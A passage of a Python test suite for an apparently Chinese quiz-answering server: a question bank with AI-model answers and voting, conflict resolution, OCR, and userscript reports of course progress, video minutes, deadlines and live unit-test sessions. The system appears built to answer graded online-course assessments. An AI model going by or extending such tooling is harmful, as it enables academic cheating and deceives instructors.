        fresh = main.bank.add({"type": "judge", "title": "新的AI题", "options": ["对", "错"],
                               "answer": "正确", "source": "ai", "status": "pending"})
        conflict = main.bank.add({"type": "judge", "title": "冲突题", "options": ["对", "错"],
                                  "answer": "正确", "source": "ai", "status": "pending", "conflict": True})
        with main.bank._lock:
            for item in main.bank._items:
                if item["id"] in (stale["id"], conflict["id"]):
                    item["created"] = time.time() - 40 * 86400
        main.bank._save()
        preview = self.client.post("/api/bank/prune", json={"dry_run": True, "days": 30}).json()
        self.assertEqual(preview["count"], 1)
        applied = self.client.post("/api/bank/prune", json={"dry_run": False, "days": 30}).json()
        self.assertEqual(applied["count"], 1)
        titles = {i["title"] for i in main.bank.all()}
        self.assertNotIn("陈旧AI题", titles)
        self.assertIn("新的AI题", titles)
        self.assertIn("冲突题", titles)
        archive = os.path.join(self.tmp.name, "bank_archive.jsonl")
        self.assertTrue(os.path.exists(archive))

    def test_sqlite_backend_persists_incrementally(self):
        with tempfile.TemporaryDirectory() as tmp:
            json_path = os.path.join(tmp, "bank.json")
            db_path = os.path.join(tmp, "bank.db")
            bank = Bank(json_path, db_path)
            first = bank.add({"type": "judge", "title": "SQLite题一", "options": ["对", "错"], "answer": "正确",
                              "subject": "线代", "source": "ai"})
            bank.add({"type": "judge", "title": "SQLite题二", "options": ["对", "错"], "answer": "错误",
                      "subject": "线代"})
            bank.record_attempt(first["id"], "错误", via="m1")
            bank.flush()

            reopened = Bank(json_path, db_path)
            self.assertEqual(reopened.count(), 2)
            row = reopened.find_exact("judge", "SQLite题一", ["对", "错"], "线代")
            self.assertEqual(row["answer"], "错误")
            self.assertEqual(row["via"], "m1")

            reopened.delete(first["id"])
            reopened.flush()
            again = Bank(json_path, db_path)
            self.assertEqual(again.count(), 1)
            self.assertIsNone(again.find_exact("judge", "SQLite题一", ["对", "错"], "线代"))
            for instance in (bank, reopened, again):
                instance.close()

    def test_sqlite_backend_migrates_existing_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            json_path = os.path.join(tmp, "bank.json")
            db_path = os.path.join(tmp, "bank.db")
            seed = Bank(json_path)
            seed.add({"type": "judge", "title": "迁移题", "options": ["对", "错"], "answer": "正确"})
            migrated = Bank(json_path, db_path)
            self.assertEqual(migrated.count(), 1)
            self.assertIsNotNone(migrated.find_exact("judge", "迁移题", ["对", "错"]))
            seed.close()
            migrated.close()

    def test_fts_keyword_search_syncs_with_writes(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"), os.path.join(tmp, "bank.db"))
            first = bank.add({"type": "judge", "title": "实对称矩阵一定可以正交对角化",
                              "options": ["对", "错"], "answer": "正确", "subject": "线代"})
            bank.add({"type": "judge", "title": "随机变量的数学期望具有线性性质",
                      "options": ["对", "错"], "answer": "正确", "subject": "线代"})
            hits, total = bank.query("线代", keyword="正交对角")
            self.assertEqual(total, 1)
            self.assertEqual(hits[0]["id"], first["id"])
            # 2 字关键词走回退扫描
            _, total_short = bank.query("线代", keyword="随机")
            self.assertEqual(total_short, 1)
            bank.update(first["id"], {"title": "方阵可逆当且仅当行列式非零"})
            _, after = bank.query("线代", keyword="正交对角")
            self.assertEqual(after, 0)
            _, renamed = bank.query("线代", keyword="行列式非零")
            self.assertEqual(renamed, 1)
            bank.delete(first["id"])
            _, gone = bank.query("线代", keyword="行列式非零")
            self.assertEqual(gone, 0)
            bank.close()

    def test_http_log_persists_and_ranks_slow(self):
        from app.httplog import HttpLog
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "http_log.db")
            log = HttpLog(path)
            log.add("/a", "GET", 5.0, 200, time.time() - 10)
            log.add("/b", "GET", 120.0, 500, time.time() - 5)
            log.add("/c", "POST", 30.0, 200, time.time())
            self.assertEqual(len(log.recent(10)), 3)
            self.assertEqual(log.slow(2)[0]["path"], "/b")
            log.close()

            reopened = HttpLog(path)
            self.assertEqual(len(reopened.recent(10)), 3)
            self.assertEqual(reopened.slow(1)[0]["ms"], 120.0)
            reopened.close()

    def test_http_metrics_endpoint(self):
        with main._http_lock:
            main._http_log.clear()
        self.client.get("/health")
        data = self.client.get("/api/stats/http").json()
        self.assertGreater(data["count"], 0)
        paths = {row["path"] for row in data["paths"]}
        self.assertIn("/health", paths)

    def test_bank_list_summary_and_detail(self):
        item = main.bank.add({"type": "judge", "title": "摘要题", "options": ["对", "错"],
                              "answer": "正确", "subject": "默认"})
        main.bank.update(item["id"], {"answer": "错误"})
        listed = self.client.get("/api/bank?summary=1&keyword=摘要题").json()["items"][0]
        self.assertNotIn("history", listed)
        self.assertEqual(listed["history_len"], 1)
        self.assertEqual(listed["history_preview"], ["正确"])
        detail = self.client.get(f"/api/bank/item/{item['id']}").json()
        self.assertEqual(detail["history"][0]["answer"], "正确")
        self.assertEqual(detail["id"], item["id"])

    def test_conflicts_list_and_resolve(self):
        item = main.bank.add({"type": "judge", "title": "裁决题", "options": ["对", "错"],
                              "answer": "正确", "subject": "默认"})
        main.bank.update(item["id"], {"answer": "错误"})
        data = self.client.get("/api/bank/conflicts").json()
        self.assertEqual(data["total"], 1)
        self.assertEqual(data["items"][0]["id"], item["id"])
        resolved = self.client.post(f"/api/bank/{item['id']}/resolve", json={"answer": "正确"}).json()
        self.assertTrue(resolved["ok"])
        self.assertFalse(resolved["item"]["conflict"])
        self.assertEqual(resolved["item"]["status"], "adopted")
        self.assertEqual(self.client.get("/api/bank/conflicts").json()["total"], 0)
        bad = self.client.post(f"/api/bank/{item['id']}/resolve", json={"answer": "Z"})
        self.assertEqual(bad.status_code, 400)

    def test_conflicts_join_vote_suggestion_and_filter(self):
        item = main.bank.add({"type": "judge", "title": "投票建议题", "options": ["对", "错"],
                              "answer": "正确", "subject": "默认"})
        main.bank.update(item["id"], {"answer": "错误"})
        main.vote_queue.add(main.bank.find_by_id(item["id"]) or item, "正确",
                            {"votes": {"正确": 3, "错误": 1}, "samples": 3})
        data = self.client.get("/api/bank/conflicts?suggested=1").json()
        row = next(r for r in data["items"] if r["id"] == item["id"])
        self.assertEqual(row["vote_suggestion"]["answer"], "正确")
        self.assertEqual(row["vote_suggestion"]["current"], "错误")
        self.assertEqual(row["vote_suggestion"]["votes"]["正确"], 3)
        self.assertTrue(all(r.get("vote_suggestion") for r in data["items"]))
        # 没有建议的冲突不会出现在筛选结果里
        other = main.bank.add({"type": "judge", "title": "无建议题", "options": ["对", "错"],
                               "answer": "正确", "subject": "默认"})
        main.bank.update(other["id"], {"answer": "错误"})
        ids = [r["id"] for r in self.client.get("/api/bank/conflicts?suggested=1").json()["items"]]
        self.assertIn(item["id"], ids)
        self.assertNotIn(other["id"], ids)

    def test_import_kaoshibao_xlsx(self):
        from openpyxl import Workbook
        workbook = Workbook()
        sheet = workbook.active
        sheet.append([])
        sheet.append(["题干（必填）", "题型 （必填）", "选项 A", "选项 B", "选项 C", "选项 D",
                      "选项E\n(勿删)", "选项F\n(勿删)", "选项G\n(勿删)", "选项H\n(勿删)",
                      "正确答案\n（必填）", "解析\n（勿删）", "章节\n（勿删）", "难度"])
        sheet.append(["中国首都是？", "单选题", "北京", "上海", "广州", "深圳",
                      "", "", "", "", "A", "", "第一章", "简单"])
        sheet.append(["地球是圆的", "判断题", "对", "错", "", "", "", "", "", "", "对", "", "", ""])
        sheet.append(["水的化学式是__", "填空题", "H2O", "", "", "", "", "", "", "", "", "", "", ""])
        sheet.append(["论述题示例", "简答题", "", "", "", "", "", "", "", "", "参考答案", "", "", ""])
        buffer = io.BytesIO()
        workbook.save(buffer)

        resp = self.client.post(
            "/api/bank/import-xlsx",
            files={"file": ("题库.xlsx", buffer.getvalue(),
                            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
            data={"subject": "默认"},
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data["created"], 3)
        self.assertEqual(data["skipped"], 1)
        single = main.bank.find_exact("single", "中国首都是？", ["北京", "上海", "广州", "深圳"], "默认")
        self.assertEqual(single["answer"], "A")
        self.assertEqual(single["source"], "official")
        judge = main.bank.find_exact("judge", "地球是圆的", ["对", "错"], "默认")
        self.assertEqual(judge["answer"], "正确")
        completion = main.bank.find_exact("completion", "水的化学式是__", [], "默认")
        self.assertEqual(completion["answer"], "H2O")

    def test_local_ocr_transcribe_short_circuits_vision(self):
        provider = main.store.enabled()[0]
        main.settings.update({"local_ocr": True})
        with mock.patch.object(main.ocr, "extract", return_value=("图片里的公式", "pix2text")), \
                mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用视觉模型"))):
            text, engine = asyncio.run(main._transcribe([provider], ["data:image/png;base64,AAA"]))
        self.assertEqual(text, "图片里的公式")
        self.assertEqual(engine, "本地OCR:pix2text")

    def test_local_ocr_invalid_image_returns_empty(self):
        from app.formula_ocr import FormulaOCR
        engine = FormulaOCR()
        text, used = engine.extract(["data:image/png;base64,AAA", "not-a-data-url"])
        self.assertEqual(text, "")
        self.assertEqual(used, "")

    def test_auto_resolve_safe_rules(self):
        consistent = main.bank.add({"type": "judge", "title": "一致冲突题", "options": ["对", "错"],
                                    "answer": "正确", "status": "pending", "conflict": True})
        with main.bank._lock:
            for item in main.bank._items:
                if item["id"] == consistent["id"]:
                    item["history"] = [{"answer": "正确", "source": "calibrated", "at": time.time()}]
        official = main.bank.add({"type": "judge", "title": "官方冲突题", "options": ["对", "错"],
                                  "answer": "错误", "status": "pending"})
        with main.bank._lock:
            for item in main.bank._items:
                if item["id"] == official["id"]:
                    item["history"] = [{"answer": "正确", "source": "official", "at": time.time()}]
                    item["conflict"] = True
        manual = main.bank.add({"type": "judge", "title": "无解冲突题", "options": ["对", "错"],
                                "answer": "错误", "status": "pending", "conflict": True})
        preview = main._auto_resolve_safe(True)
        self.assertGreaterEqual(preview["consistent"], 1)
        self.assertGreaterEqual(preview["official"], 1)
        self.assertGreaterEqual(preview["skipped"], 1)
        applied = main._auto_resolve_safe(False)
        self.assertGreaterEqual(applied["consistent"], 1)
        row = main.bank.find_exact("judge", "一致冲突题", ["对", "错"])
        self.assertFalse(row["conflict"])
        self.assertEqual(row["status"], "adopted")
        row = main.bank.find_exact("judge", "官方冲突题", ["对", "错"])
        self.assertEqual(row["answer"], "正确")
        self.assertEqual(row["source"], "official")
        row = main.bank.find_exact("judge", "无解冲突题", ["对", "错"])
        self.assertTrue(row["conflict"])

    def test_auto_resolve_uses_sibling_memory_and_snapshot(self):
        """自动裁决按 官方同题 → 可信记忆 → 快照真值 的顺序补答案。"""
        class _Mem:
            def __init__(self, table):
                self.table = table

            def recall(self, *, qtype, title, options, subject="", image_hash=""):
                return self.table.get(title)

        class _Truth:
            def __init__(self, table):
                self.table = table

            def ensure_async(self, force=False):
                pass

            def lookup(self, qtype, title, options, image_hash=""):
                return self.table.get(title)

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "官方同题题", "options": [],
                      "answer": "7", "source": "official", "status": "adopted"})
            bank.add({"type": "completion", "title": "官方同题题", "options": [],
                      "answer": "-27", "source": "ai", "status": "pending",
                      "conflict": True})
            bank.add({"type": "completion", "title": "记忆题", "options": [],
                      "answer": "-27", "source": "ai", "status": "pending",
                      "conflict": True})
            bank.add({"type": "completion", "title": "快照题", "options": [],
                      "answer": "-27", "source": "ai", "status": "pending",
                      "conflict": True})
            bank.add({"type": "completion", "title": "无解题", "options": [],
                      "answer": "-27", "source": "ai", "status": "pending",
                      "conflict": True})
            memory = _Mem({"记忆题": {"answer": "3", "outcome_source": "page",
                                      "confidence": 0.98}})
            truth = _Truth({"快照题": {"answer": "5", "evidence": 2}})
            preview = main._auto_resolve_safe(
                True, memory=memory, truth=truth, bank_obj=bank)
            self.assertEqual(preview["official"], 1)
            self.assertEqual(preview["memory"], 1)
            self.assertEqual(preview["snapshot"], 1)
            self.assertEqual(preview["skipped"], 1)
            applied = main._auto_resolve_safe(
                False, memory=memory, truth=truth, bank_obj=bank)
            self.assertEqual(applied["candidates"], preview["candidates"])
            rows = {item["title"]: item for item in bank.all()}
            self.assertEqual(rows["官方同题题"]["answer"], "7")
            self.assertEqual(rows["记忆题"]["answer"], "3")
            self.assertEqual(rows["记忆题"]["source"], "official")
            self.assertEqual(rows["快照题"]["answer"], "5")
            self.assertEqual(rows["快照题"]["official_via"], "page")
            self.assertTrue(rows["无解题"]["conflict"])
            self.assertFalse(rows["记忆题"]["conflict"])

    def test_auto_resolve_skips_low_confidence_memory(self):
        """记忆置信度不足 0.9 时不能自动改库。"""
        class _Mem:
            def recall(self, *, qtype, title, options, subject="", image_hash=""):
                return {"answer": "3", "outcome_source": "feedback", "confidence": 0.7}

        class _Truth:
            def ensure_async(self, force=False):
                pass

            def lookup(self, qtype, title, options, image_hash=""):
                return None

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "低置信记忆题", "options": [],
                      "answer": "-27", "source": "ai", "status": "pending",
                      "conflict": True})
            stats = main._auto_resolve_safe(
                False, memory=_Mem(), truth=_Truth(), bank_obj=bank)
            self.assertEqual(stats["skipped"], 1)
            self.assertEqual(bank.all()[0]["answer"], "-27")
            self.assertTrue(bank.all()[0]["conflict"])

    def test_auto_settings_clamped(self):
        data = self.client.put("/api/settings", json={
            "auto_calibrate": True, "auto_calibrate_limit": 9999,
            "auto_vote": True, "auto_vote_limit": 0, "auto_vote_write": True,
        }).json()
        self.assertTrue(data["auto_calibrate"])
        self.assertEqual(data["auto_calibrate_limit"], 500)
        self.assertEqual(data["auto_vote_limit"], 1)
        self.assertTrue(data["auto_vote_write"])

    def test_daily_auto_calibrate_and_vote(self):
        main.settings.update({"auto_calibrate": True, "auto_calibrate_limit": 5,
                              "auto_vote": True, "auto_vote_limit": 5, "auto_vote_write": False})
        main.cache.set("k-auto", "自动校准题", "A", "p", "single", '["甲","乙"]', "默认", "")
        main.bank.add({"type": "single", "title": "自动投票题", "options": ["甲", "乙"],
                       "answer": "A", "status": "pending"})
        main.bank.update(main.bank.all()[-1]["id"], {"answer": "B"})
        detail = asyncio.run(main._run_daily_tasks(skip_vote=False))
        self.assertTrue(detail["calibrate"]["started"])
        self.assertEqual(detail["vote"]["dry_run"], True)
        self.assertLessEqual(detail["vote"]["total"], 5)
        with main._calibrate_lock:
            main._calibrate_state["stop"] = True
            main._calibrate_state["running"] = False

    def test_progress_idempotent_by_client_seq(self):
        payload = {
            "account": "甲", "course": "幂等课", "done": 1, "total": 4,
            "client_id": "cid-test-1", "seq": 7, "scope": "chapter",
        }
        first = self.client.post("/api/progress", json=payload).json()
        self.assertTrue(first["ok"])
        self.assertNotIn("duplicate", first)
        second = self.client.post("/api/progress", json=payload).json()
        self.assertTrue(second.get("duplicate"))
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["extra"]["scope"], "chapter")
        # seq 递进后是新数据，不再算重复
        third = self.client.post("/api/progress", json={**payload, "seq": 8, "done": 2}).json()
        self.assertNotIn("duplicate", third)
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["done"], 2)

    def test_progress_frame_role_recorded(self):
        self.client.post("/api/progress", json={
            "account": "甲", "course": "分帧课", "done": 0, "total": 0,
            "frame_role": "child", "scope": "section",
        })
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["extra"]["frame_role"], "child")
        self.assertEqual(row["extra"]["scope"], "section")

    def test_heartbeat_records_script_diagnostics(self):
        self.client.post("/api/probe/heartbeat", json={
            "name": "ocs-progress-test", "ver": "0.11.0", "url": "http://x/y",
            "client_id": "cid-1", "pending": 3, "last_success_at": 12345,
            "last_error": "boom", "reporting": False,
        })
        probe = self.client.get("/api/probes").json()["items"]["ocs-progress-test"]
        self.assertEqual(probe["extra"]["pending"], 3)
        self.assertEqual(probe["extra"]["last_error"], "boom")
        self.assertEqual(probe["extra"]["client_id"], "cid-1")

    def test_progress_replay_lists_done_videos(self):
        self.client.post("/api/progress", json={
            "account": "甲", "course": "复播课", "done": 2, "total": 4, "key": "复播课|4",
            "extra": {"items": [
                {"t": "video", "n": "已看视频", "c": "第一章", "l": "第一节", "k": "111", "d": 1},
                {"t": "video", "n": "未看视频", "c": "第一章", "l": "第一节", "k": "222", "d": 0},
                {"t": "doc", "n": "已看文档", "c": "第一章", "l": "第一节", "k": "333", "d": 1},
            ]},
        })
        data = self.client.get("/api/progress/replay").json()
        self.assertEqual(data["total"], 1)
        self.assertEqual(data["items"][0]["title"], "已看视频")
        self.assertEqual(data["items"][0]["cid"], "111")

    def test_progress_video_stats_and_requirement(self):
        self.client.post("/api/progress", json={
            "account": "甲", "course": "时长课", "done": 85, "total": 91, "key": "时长课|91",
            "extra": {"video_stats": {"minutes": 347, "count": 61, "lesson_done": 85, "lesson_total": 91}},
        })
        resp = self.client.post("/api/progress/requirement", json={
            "account": "甲", "key": "时长课|91", "minutes": 360,
        })
        self.assertEqual(resp.status_code, 200)
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["extra"]["video_required"], 360)
        self.assertEqual(row["extra"]["video_stats"]["minutes"], 347)

    def test_video_history_accumulates(self):
        self.client.post("/api/progress", json={
            "account": "甲", "course": "时长历史课", "done": 1, "total": 2, "key": "时长历史课|2",
            "extra": {"video_stats": {"minutes": 100, "count": 10}},
        })
        self.client.post("/api/progress", json={
            "account": "甲", "course": "时长历史课", "done": 1, "total": 2, "key": "时长历史课|2",
            "extra": {"video_stats": {"minutes": 130, "count": 12}},
        })
        row = self.client.get("/api/progress").json()["items"][0]
        history = row["extra"]["video_history"]
        self.assertEqual(len(history), 2)
        self.assertEqual(history[-1]["minutes"] - history[0]["minutes"], 30)

    def test_deadlines_empty_scan_keeps_note(self):
        self.client.post("/api/deadlines", json={
            "account": "甲", "course": "空扫描课", "items": [], "partial": True,
            "expected": 0, "note": "dom=0,api=0,anchors=3(tid 0/aid 0/both 0)",
        })
        data = self.client.get("/api/deadlines").json()
        self.assertEqual(data["count"], 0)
        self.assertEqual(len(data["groups"]), 1)
        self.assertIn("dom=0", data["groups"][0]["note"])

    def test_deadlines_report_and_summary(self):
        soon = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() + 3 * 86400))
        recent = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() - 3 * 86400))
        payload = {
            "account": "甲", "course": "DDL课", "partial": True, "expected": 3,
            "note": "只读到 2 个", "url": "https://example.com/testlist",
            "items": [
                {"tid": "1", "aid": "2", "name": "第一章测验", "kind": "测验",
                 "deadline": recent, "status": "unsubmitted"},
                {"tid": "1", "aid": "3", "name": "第二章作业", "kind": "作业",
                 "deadline": soon, "status": "done"},
            ],
        }
        self.client.post("/api/deadlines", json=payload)
        data = self.client.get("/api/deadlines").json()
        self.assertEqual(data["count"], 2)
        self.assertEqual(data["summary"]["overdue"], 1)
        self.assertEqual(data["summary"]["due7"], 1)
        self.assertEqual(data["summary"]["unsubmitted"], 1)
        self.assertTrue(data["items"][0]["partial"])
        self.assertEqual(data["items"][0]["name"], "第一章测验")

        # 部分上报只读到一条：旧条目必须保留（长期积累），不能像旧实现那样被替换掉。
        payload["items"] = payload["items"][:1]
        self.client.post("/api/deadlines", json=payload)
        data = self.client.get("/api/deadlines").json()
        self.assertEqual(data["count"], 2)
        self.assertEqual({item["name"] for item in data["items"]},
                         {"第一章测验", "第二章作业"})
        self.assertEqual(self.client.delete("/api/deadlines").json()["cleared"], 1)
        self.assertEqual(self.client.get("/api/deadlines").json()["count"], 0)

    def test_deadlines_partial_empty_scan_keeps_old_items(self):
        """空的部分扫描不能把之前积累的 DDL 抹掉。"""
        future = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() + 30 * 86400))
        self.client.post("/api/deadlines", json={
            "account": "甲", "course": "积累课", "partial": True, "items": [
                {"name": "第一次作业", "kind": "作业", "deadline": future, "status": "pending"},
            ],
        })
        self.client.post("/api/deadlines", json={
            "account": "甲", "course": "积累课", "partial": True, "items": [],
            "note": "dom=0,api=0",
        })
        data = self.client.get("/api/deadlines").json()
        self.assertEqual(data["count"], 1)
        self.assertEqual(data["items"][0]["name"], "第一次作业")

    def test_deadlines_expired_items_are_archived(self):
        """截止超过保留期的条目自动归档，看板只留当前条目。"""
        old = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() - 40 * 86400))
        recent = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() - 3 * 86400))
        self.client.post("/api/deadlines", json={
            "account": "甲", "course": "归档课", "partial": False, "items": [
                {"name": "老作业", "kind": "作业", "deadline": old, "status": "done"},
                {"name": "近期作业", "kind": "作业", "deadline": recent, "status": "done"},
            ],
        })
        data = self.client.get("/api/deadlines").json()
        self.assertEqual(data["count"], 1)
        self.assertEqual(data["items"][0]["name"], "近期作业")
        self.assertEqual(data["archived_count"], 1)
        self.assertEqual(data["summary"]["archived"], 1)
        archived = self.client.get("/api/deadlines?include_archived=1").json()["archived"]
        self.assertEqual(len(archived), 1)
        self.assertEqual(archived[0]["name"], "老作业")
        self.assertEqual(archived[0]["archive_reason"], "expired")
        self.assertEqual(self.client.delete("/api/deadlines/archive").json()["cleared"], 1)
        self.assertEqual(self.client.get("/api/deadlines").json()["archived_count"], 0)

    def test_deadlines_full_report_marks_missing_items(self):
        """完整上报里没再出现的条目保留但标记 missing_since，不直接删除。"""
        future = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() + 5 * 86400))
        payload = {
            "account": "甲", "course": "消失课", "partial": False, "items": [
                {"name": "还在的作业", "kind": "作业", "deadline": future, "status": "pending"},
                {"name": "消失的作业", "kind": "作业", "deadline": future, "status": "pending"},
            ],
        }
        self.client.post("/api/deadlines", json=payload)
        payload["items"] = payload["items"][:1]
        self.client.post("/api/deadlines", json=payload)
        data = self.client.get("/api/deadlines").json()
        self.assertEqual(data["count"], 2)
        by_name = {item["name"]: item for item in data["items"]}
        self.assertNotIn("missing_since", by_name["还在的作业"])
        self.assertIn("missing_since", by_name["消失的作业"])

    def test_install_page_lists_scripts(self):
        page = self.client.get("/install")
        self.assertEqual(page.status_code, 200)
        self.assertIn("ocs-progress.user.js", page.text)
        self.assertNotIn("__VERSIONS__", page.text)
        served = self.client.get("/api/tools/versions").json()["served"]
        self.assertIn(served["ocs-progress.user.js"], page.text)
        self.assertEqual(self.client.get("/tools").status_code, 200)

    def test_local_script_variant_and_bundle(self):
        local = self.client.get("/tools/ocs-progress.user.js?local=1")
        self.assertEqual(local.status_code, 200)
        self.assertNotIn("@updateURL", local.text)
        self.assertNotIn("@downloadURL", local.text)
        self.assertIn("@version", local.text)
        self.assertIn("function detectCourses", local.text)

        bundle = self.client.get("/install/bundle.zip?local=1")
        self.assertEqual(bundle.status_code, 200)
        with zipfile.ZipFile(io.BytesIO(bundle.content)) as zf:
            names = zf.namelist()
            self.assertIn("ocs-progress.user.js", names)
            self.assertIn("chaoxing-probe.user.js", names)
            self.assertIn("mooc-result-probe.user.js", names)
            self.assertIn("安装说明.txt", names)
            script = zf.read("ocs-progress.user.js").decode("utf-8")
            self.assertNotIn("@updateURL", script)
            note = zf.read("安装说明.txt").decode("utf-8")
            self.assertIn("脱网关版", note)

    def test_tools_meta_returns_header_only(self):
        meta = self.client.get("/tools/ocs-progress.meta.js")
        self.assertEqual(meta.status_code, 200)
        self.assertTrue(meta.text.startswith("// ==UserScript=="))
        self.assertIn("@version", meta.text)
        self.assertIn("@updateURL", meta.text)
        self.assertNotIn("function detectCourses", meta.text)
        full = self.client.get("/tools/ocs-progress.user.js")
        self.assertEqual(full.status_code, 200)
        self.assertIn("function detectCourses", full.text)
        versions = self.client.get("/api/tools/versions").json()["served"]
        self.assertIn("ocs-progress.user.js", versions)

    def test_scene_state_and_endpoints(self):
        from app.scene_state import SceneState
        with tempfile.TemporaryDirectory() as tmp:
            state = SceneState(os.path.join(tmp, "scene.json"))
            self.assertEqual(state.get(), "")
            state.set("quick", "https://x/quiz")
            self.assertEqual(state.get(), "quick")
            state.set("bogus")
            self.assertEqual(state.get(), "")
        self.client.post("/api/scene", json={"scene": "unit", "url": "https://x/test"})
        data = self.client.get("/api/scene").json()
        self.assertEqual(data["scene"], "unit")
        self.assertEqual(data["active"], "unit")

    def test_quality_tracks_scene(self):
        main.stats.quality_bump("p", "s", True, "quick")
        main.stats.quality_bump("p", "s", False, "unit")
        q = main.stats.quality_snapshot()
        self.assertEqual(q["scenes"]["quick"], {"ok": 1, "bad": 0, "total": 1, "rate": 1.0})
        self.assertEqual(q["scenes"]["unit"]["bad"], 1)

    def test_unit_scene_forces_vote(self):
        main.settings.update({"cross_check": False, "low_conf_vote": False})
        self.client.post("/api/scene", json={"scene": "unit"})
        main.bank.add({"type": "single", "title": "单元强制投票题", "options": ["甲", "乙", "丙"],
                       "answer": "A", "status": "pending"})
        provider = main.store.enabled()[0]
        fake = ("B", provider, 5, [], {})
        with mock.patch.object(main, "_ask_limited", mock.AsyncMock(return_value=fake)),                 mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            data = self.client.get("/query", params={
                "title": "单元强制投票题", "type": "single", "options": '["甲","乙","丙"]'
            }).json()
        self.assertEqual(data["data"]["scene"], "unit")
        self.assertIsNotNone(data["data"]["vote"])

    def test_unit_pending_branch_requires_independent_consensus(self):
        """待确认题复核也必须 ≥2 个独立模型一致；同一模型两轮的两票不算共识。"""
        main.settings.update({"cross_check": False, "low_conf_vote": False})
        self.client.post("/api/scene", json={"scene": "unit"})
        main.bank.add({"type": "single", "title": "待确认复核题", "options": ["甲", "乙"],
                       "answer": "A", "status": "pending"})
        provider = main.store.enabled()[0]

        def fake_meta(models: int):
            return {
                "unit_votes": {"B": 2}, "unit_agree": 2, "unit_models": models,
                "unit_share": 1.0, "unit_rounds": 2, "unit_errors": [],
                "unit_confidence": 0.9,
            }

        with mock.patch.object(
            main, "_unit_ask", mock.AsyncMock(return_value=("B", provider, 5, [], fake_meta(1)))
        ):
            data = self.client.post("/query", json={
                "title": "待确认复核题", "type": "single", "options": ["甲", "乙"],
            }).json()["data"]
        self.assertIsNone(data["consensus"])
        self.assertEqual(data["vote"]["models"], 1)
        self.assertEqual(data["vote"]["share"], 1.0)

        with mock.patch.object(
            main, "_unit_ask", mock.AsyncMock(return_value=("B", provider, 5, [], fake_meta(2)))
        ):
            data = self.client.post("/query", json={
                "title": "待确认复核题", "type": "single", "options": ["甲", "乙"],
            }).json()["data"]
        self.assertEqual(data["consensus"], "unit")
        self.assertEqual(data["vote"]["models"], 2)

    def test_unit_session_records_and_finalizes(self):
        from app.unit_sessions import UnitSessions
        with tempfile.TemporaryDirectory() as tmp:
            store = UnitSessions(os.path.join(tmp, "unit.json"))
            store.ensure("https://x/test", 2, "t1")
            store.add_answer("judge", "题目一", "正确", {"source": "official", "risk": False})
            current = store.current()
            self.assertEqual(current["total"], 2)
            self.assertEqual(current["answered"], 1)
            self.assertFalse(current["finalized"])
            store.finalize(True)
            self.assertIsNone(store.current())
            self.assertEqual(store.clear(), 1)

        main.settings.update({"official_cross_check": False})
        self.client.post("/api/scene", json={"scene": "unit", "total": 2, "tid": "t1"})
        main.bank.add({"type": "judge", "title": "会话记录题", "options": ["对", "错"],
                       "answer": "正确", "source": "official", "status": "adopted"})
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用"))):
            data = self.client.get("/query", params={"title": "会话记录题", "type": "judge", "options": '["对","错"]'}).json()["data"]
        self.assertEqual(data["official_check"], "")
        self.assertFalse(data["risk"])
        session = self.client.get("/api/unit-session").json()["session"]
        self.assertEqual(session["total"], 2)
        self.assertEqual(session["answered"], 1)
        self.assertEqual(session["answers"][0]["source"], "official")
        self.assertFalse(session["answers"][0]["risk"])
        self.assertEqual(self.client.delete("/api/unit-session").json()["cleared"], 1)

    def test_unit_session_labels_single_vote_as_vote_not_consensus(self):
        """只有一个模型答出时，标签不能写「共识」，否则管理台会误导人。"""
        self.client.post("/api/scene", json={"scene": "unit"})
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            data = self.client.post("/query", json={
                "title": "单票题", "type": "single", "options": ["甲", "乙"],
            }).json()["data"]
        self.assertEqual(data["cross"], "unit-vote")
        self.assertIsNone(data["consensus"])
        self.assertTrue(data["risk"])
        session = self.client.get("/api/unit-session").json()["session"]
        entry = session["answers"][-1]
        self.assertEqual(entry["match"], "unit-vote")
        self.assertEqual(entry["cross"], "unit-vote")
        self.assertNotEqual(entry["match"], "unit-consensus")
        self.client.delete("/api/unit-session")

    def test_unit_session_remove_answer(self):
        from app.unit_sessions import UnitSessions
        with tempfile.TemporaryDirectory() as tmp:
            store = UnitSessions(os.path.join(tmp, "unit.json"))
            store.ensure("https://x/test", 2, "t1")
            store.add_answer("judge", "题目一", "正确", {"source": "official"})
            store.add_answer("single", "题目二", "A", {"source": "ai"})
            self.assertTrue(store.remove_answer("题目一"))
            self.assertFalse(store.remove_answer("题目一"))
            self.assertFalse(store.remove_answer(""))
            current = store.current()
            self.assertEqual(current["answered"], 1)
            self.assertEqual(current["answers"][0]["title"], "题目二")

        main.unit_sessions.ensure("https://x/api", 1, "t-api")
        main.unit_sessions.add_answer("judge", "接口删除题", "正确", {})
        data = self.client.post("/api/unit-session/remove", json={"title": "接口删除题"}).json()
        self.assertTrue(data["ok"])
        self.assertEqual(data["session"]["answered"], 0)
        self.assertFalse(
            self.client.post("/api/unit-session/remove", json={"title": "接口删除题"}).json()["ok"]
        )
        self.assertEqual(
            self.client.post("/api/unit-session/remove", json={}).status_code, 400
        )
        self.client.delete("/api/unit-session")

    def test_unit_session_keeps_long_title(self):
